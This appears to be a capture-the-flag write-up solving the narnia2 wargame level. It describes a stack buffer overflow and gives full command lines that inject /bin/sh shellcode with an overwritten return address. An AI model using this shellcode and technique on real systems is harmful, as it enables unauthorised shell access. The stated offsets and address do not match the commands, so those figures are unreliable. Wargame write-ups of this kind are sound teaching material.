Solution

Upon examining narnia2.c it has a buffer overflow vulnerability. To take advantage of this, I first found an apropriate shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php. With this I then went into gdb with an input value that greatly exceeded the buffer to cause a seg fault ('A' * 200) With gdb I was able to find the address of the start of the buffer. Now that we know the address, we can build our exploit

103 bytes will clobber right before the return address eip

(29 Bytes of Shellcode) + ("A" * 103) + (4 Byte Address where shellcode is)

Address 0xffffd588

(note, remember the machine is little endian)

gdb --args ./narnia2 $(python -c 'print "AAAA" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 100 + "\xbc\xd5\xff\xff"')

./narnia2 $(python -c 'print "AAAA" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 100 + "\xbc\xd5\xff\xff"')



